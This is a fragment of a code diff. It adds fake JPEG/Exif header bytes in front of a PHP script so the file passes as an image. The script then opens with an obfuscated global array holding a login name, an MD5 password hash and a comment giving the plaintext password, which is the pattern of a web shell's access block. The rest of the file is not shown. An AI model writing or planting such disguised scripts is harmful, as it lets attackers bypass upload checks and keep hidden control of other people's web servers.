@@ -1,4 +1,4 @@
-<?php
+     JFIF        \Exif  II*         4           i     4        <?php
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'anesong',
     'password' => 'da48f6d3767fb7d180625a7006b1b637', //md5(ehsan)
